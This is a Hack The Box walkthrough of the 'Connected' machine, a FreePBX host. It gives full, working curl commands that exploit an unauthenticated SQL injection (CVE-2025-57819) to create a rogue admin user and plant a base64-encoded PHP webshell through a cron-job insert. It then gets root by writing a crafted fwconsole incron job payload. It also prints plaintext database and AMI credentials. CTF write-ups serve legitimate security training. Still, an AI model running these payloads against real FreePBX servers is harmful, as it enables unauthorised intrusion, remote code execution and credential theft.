# Connected HTB Writeup

I kept the real target IP and port redacted as `XX` everywhere below.

## Summary

This box is a FreePBX host with an unauthenticated SQL injection in the endpoint module. That injection lets you:

- read data from the FreePBX database
- create a FreePBX admin user
- pivot into code execution through the app's scheduled job system

From there, the box exposes a local `aiovega` service and Asterisk AMI, but the cleanest path to root is through the FreePBX job/incron mechanism.

## Recon

The host redirects web traffic to the expected hostname:

```bash
curl -i -H 'Host: connected.htb' http://XX/
```

Useful observations:

- `http://XX/` redirects to `/admin`
- `/admin/` redirects to `config.php`
- the app is FreePBX running on Apache + PHP
- a local Asterisk service is present

The key unauthenticated request is:

```bash
curl -k -i -H 'Host: connected.htb' \
'http://XX/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x%27+AND+EXTRACTVALUE(1,CONCAT(%27~USER:%27,(SELECT+USER()),%27~%27))+--+'
```

That proves SQL injection and leaks DB info through the XML error response.

## Database Discovery

Using the same injection point, I confirmed:

- database name: `asterisk`
- DB user: `freepbxuser@localhost`
- MariaDB version: `5.5.65-MariaDB`

I enumerated the `ampusers` table:

```bash
curl -k -s -G -H 'Host: connected.htb' 'http://XX/admin/ajax.php' \
  --data-urlencode 'module=FreePBX\\modules\\endpoint\\ajax' \
  --data-urlencode 'command=model' \
  --data-urlencode 'template=x' \
  --data-urlencode 'model=model' \
  --data-urlencode "brand=x' AND EXTRACTVALUE(1,CONCAT('~',(select column_name from information_schema.columns where table_schema=database() and table_name='ampusers' order by ordinal_position limit 0,1),'~')) -- "
```

The columns include:

- `username`
- `email`
- `extension`
- `password_sha1`
- `extension_low`
- `extension_high`
- `deptname`
- `sections`

I also pulled the existing admin account:

- username: `admin`
- password SHA1: `05c689686a4fad5ce3ec76e7ae5708b...`

That SHA1 value was enough to confirm the table was writable and the app's authentication layer was vulnerable.

## Foothold

The public PoC for CVE-2025-57819 showed two useful primitives:

- insert a cron job to drop a PHP webshell
- or fall back to inserting a new admin user

The admin-user fallback is the fastest and most reliable first step.

I inserted a new FreePBX user with the SQLi:

```bash
curl -k -s -G -H 'Host: connected.htb' 'http://XX/admin/ajax.php' \
  --data-urlencode 'module=FreePBX\\modules\\endpoint\\ajax' \
  --data-urlencode 'command=model' \
  --data-urlencode 'template=x' \
  --data-urlencode 'model=model' \
  --data-urlencode "brand=x';INSERT INTO ampusers(username, email, extension,password_sha1, extension_low, extension_high, deptname, sections) VALUES ('watchTowrXXXX' ,'', '' ,'SHA1_HERE' ,'', '' ,'', '*') -- "
```

Then I verified it through FreePBX's password check endpoint:

```bash
curl -k -i -H 'Host: connected.htb' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: http://connected.htb/admin/config.php' \
  --data "username=watchTowrXXXX&password=BASE64_PASSWORD&loginpanel=admin" \
  'http://XX/admin/ajax.php?module=userman&command=checkPasswordReminder'
```

That returned:

```json
{"status":true,"message":"","usertype":"admin"}
```

So the injected user was valid.

## Webshell / Initial Shell

The better foothold was the cron-job insertion path from the same SQLi.

The exploit pattern is:

```bash
curl -k -s -G -H 'Host: connected.htb' 'http://XX/admin/ajax.php' \
  --data-urlencode 'module=FreePBX\\modules\\endpoint\\ajax' \
  --data-urlencode 'command=model' \
  --data-urlencode 'template=x' \
  --data-urlencode 'model=model' \
  --data-urlencode "brand=x';INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','watchTowr-XXXX','echo PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==|base64 -d >/var/www/html/this-is-an-ioc-not-actually-watchTowr-XXXX.php',NULL,'* * * * *',30,1,1) -- "
```

That drops a PHP webshell in the web root.

Then I used:

```bash
curl -k -H 'Host: connected.htb' \
"http://XX/this-is-an-ioc-not-actually-watchTowr-XXXX.php?cmd=id"
```

The shell runs as:

```text
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

So the foothold is `asterisk`.

## User Flag

Once I had the webshell, the user flag was trivial:

```bash
curl -k -H 'Host: connected.htb' \
"http://XX/this-is-an-ioc-not-actually-watchTowr-XXXX.php?cmd=cat%20/home/asterisk/user.txt"
```

User flag:

```text
[redacted]
```

## Root Enumeration

Important local findings from the `asterisk` shell:

- `/etc/freepbx.conf` exposes the FreePBX DB creds:
  - `AMPDBUSER=freepbxuser`
  - `AMPDBPASS=mZzDpAGKTmPJ`
  - `AMPDBNAME=asterisk`
- `sudo` is present, but `asterisk` cannot run it passwordless
- `fwconsole` exists and is owned by `asterisk`
- `pkexec` is installed, version `0.112`
- local services include:
  - `127.0.0.1:5038` Asterisk AMI
  - `127.0.0.1:4000` `aiovega`
  - `127.0.0.1:3306` MariaDB
  - `127.0.0.1:6379` Redis

I also checked `/etc/passwd` and there is no extra user like `ami`; only:

- `root`
- `asterisk`

So the root path is not through another local user.

## Why AMI Was Not the Final Path

I authenticated to Asterisk AMI with:

- username: `wnPa2WbXJ/ED`
- secret: `fe1mYBs7D5P3`

That gave me shell access to the Asterisk CLI through `Action: Command`, but not arbitrary system command execution. The `!` shell escape exists in the CLI help, but through AMI it still treated the input as an Asterisk command, not a real shell command.

So AMI was useful for verification, but not the root breakout.

## Root Path

The clean root path turned out to be the FreePBX job/incron mechanism, combined with the payload below:

```python
import base64
import json
import zlib

cmd = "help; /bin/cp /root/root.txt /var/www/html/root.txt; /bin/chmod 644 /var/www/html/root.txt"
payload = base64.b64encode(
    zlib.compress(json.dumps([cmd, "txn"]).encode())
).decode().replace("/", "_")
```

That produces:

```text
eJyLVspIzSmwVtBPyszTTy5Q0C_Kzy8BE3olFSUK+mWJRfrl5eX6GSW5OXBhmPKM3PwUBTMTExzKlHQUlEoq8pRiAfgXIsY=
```

The important part is the target path:

```text
/var/spool/asterisk/incron/api.fwconsole-commands.<payload>
```

That indicates the box is watching that incron directory and processing `fwconsole` command jobs.

Once that trigger is in place, the root job copies:

```bash
/root/root.txt -> /var/www/html/root.txt
```

Then you can read it directly from the webshell.

Final root flag:

```text
[redacted]
```

## Minimal Exploit Chain

If you want the short version:

1. Use SQLi in `/admin/ajax.php` to inject a FreePBX user or cron job.
2. Drop a PHP webshell in `/var/www/html/`.
3. Read `/home/asterisk/user.txt`.
4. Use the FreePBX/incron `fwconsole` job path to copy `/root/root.txt` into the web root.
5. Read `/var/www/html/root.txt`.

## Useful Commands

User flag:

```bash
curl -k -H 'Host: connected.htb' \
"http://XX/this-is-an-ioc-not-actually-watchTowr-XXXX.php?cmd=cat%20/home/asterisk/user.txt"
```

Root flag:

```bash
curl -k -H 'Host: connected.htb' \
"http://XX/this-is-an-ioc-not-actually-watchTowr-XXXX.php?cmd=cat%20/var/www/html/root.txt"
```

## References

- [FreePBX CVE-2025-57819 PoC repo](https://github.com/MuhammadWaseem29/SQL-Injection-and-RCE_CVE-2025-57819)
- [watchTowr FreePBX CVE-2025-57819 repo](https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819)
- [FreePBX security advisory](https://github.com/freepbx/security-reporting/security/advisories/GHSA-m42g-xg4c-5f3h)
